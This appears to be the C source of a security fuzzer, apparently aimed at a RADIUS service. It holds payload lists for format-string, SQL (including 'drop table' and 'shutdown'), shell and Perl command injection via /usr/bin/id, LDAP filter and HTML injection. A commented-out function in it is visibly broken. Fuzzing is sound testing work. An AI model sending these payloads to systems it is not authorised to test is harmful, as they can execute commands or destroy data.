#include <stdio.h>
#include <string.h>
#include <fuzzer.h>

char *format[] = {
	"%i",
	"%p",
	"%n",
	NULL
};

char *sql[] = {
	"'",
	";",
	"#",
	"''; drop table UNKOWN--",
	"'';shutdown--",
	"'; drop table UNKOWN--",
	"';shutdown--",
	"; drop table UNKOWN--",
	";shutdown--",
	"test'--",
	NULL
};

char sql_attr_decoding[] = {
	'\\',
	'$',
	'%',
	'(',
	'{',
	')',
	'}'
};

char *shell[] = {
	"`",
	"$(",
	"|",
	"&",
	"exec",
	"eval",
	"&&",
	"||",
	"`/usr/bin/id`",
	"$(/usr/bin/id)",
	"|/usr/bin/id",
	"&/usr/bin/id",
	" exec /usr/bin/id",
	" eval '/usr/bin/id'",
	"; exec /usr/bin/id",
	"; eval '/usr/bin/id'",
	"| exec /usr/bin/id",
	"| eval '/usr/bin/id'",
	"& exec /usr/bin/id",
	"& eval '/usr/bin/id'",
	"|| exec /usr/bin/id",
	"|| eval '/usr/bin/id'",
	"&& exec /usr/bin/id",
	"&& eval '/usr/bin/id'",
	"&& /usr/bin/id",
	"|| /usr/bin/id",
	NULL
};

char *perl[] = {
	"`",
	"<",
	"$(",
	"|",
	"&",
	"exec",
	"eval",
	"eval()",
	"&&",
	"||",
	"`/usr/bin/id`",
	"<`/usr/bin/id`>",
	"$(/usr/bin/id)",
	"|/usr/bin/id",
	"&/usr/bin/id",
	" exec /usr/bin/id",
	" eval '/usr/bin/id'",
	" eval('/usr/bin/id')",
	"; exec /usr/bin/id",
	"; eval '/usr/bin/id'",
	"; eval('/usr/bin/id')",
	"| exec /usr/bin/id",
	"| eval '/usr/bin/id'",
	"| eval('/usr/bin/id')",
	"& exec /usr/bin/id",
	"& eval '/usr/bin/id'",
	"& eval('/usr/bin/id')",
	"|| exec /usr/bin/id",
	"|| eval '/usr/bin/id'",
	"|| eval('/usr/bin/id')",
	"&& exec /usr/bin/id",
	"&& eval '/usr/bin/id'",
	"&& eval('/usr/bin/id')",
	"&& /usr/bin/id",
	"|| /usr/bin/id",
	NULL
};

char *ldap[] = {
	"; cn=",
	"; cn=test| ",
	"; cn=test& ",
	"; cn=test( ",
	"|(cn=",
	"|(cn=test| ",
	"|(cn=test& ",
	"|(cn=test( ",
	NULL
};

char *html[] = {
	"><br>RADIUSFUZZER<",
	NULL
};



char *fuzz_format(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(format[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, format[fuzz_idx++]);

	return fuzz_str;
}

char *fuzz_sql(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(sql[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, sql[fuzz_idx++]);

	return fuzz_str;
}

/* len should be at least the length of str
char *fuzz_sql_attr_decoding(char *str, size_t len)
{
	static char fuzz_str[4096];
	static int fuzz_idx[8] = {0,0,0,0,0,0,0,0};
	// we need 7 indices an 1 indicator

	if(fuzz_idx[8] != 0)
	{
		memset((char *) &fuzz_idx, (int) 0, 8*sizeof(int));
		return NULL;
	}

	if(len > sizeof(fuzz_str))
		len = sizeof(fuzz_str));

	memset(fuzz_str, 0, sizeof(fuzz_str));

	snprintf(fuzz_str, sizeof(fuzz_str), "%s%s", str, format[fuzz_idx++]);

	return fuzz_str;
}
*/

char *fuzz_shell(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(shell[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, shell[fuzz_idx++]);

	return fuzz_str;
}

char *fuzz_perl(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(perl[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, perl[fuzz_idx++]);

	return fuzz_str;
}

char *fuzz_ldap(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(ldap[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, ldap[fuzz_idx++]);

	return fuzz_str;
}

char *fuzz_html(char *str)
{
	static char fuzz_str[4096];
	static int fuzz_idx = 0;


	if(html[fuzz_idx] == NULL)
	{
		fuzz_idx = 0;
		return NULL;
	}

	memset(fuzz_str, 0, sizeof fuzz_str);
	snprintf(fuzz_str, sizeof fuzz_str, "%s%s", str, html[fuzz_idx++]);

	return fuzz_str;
}


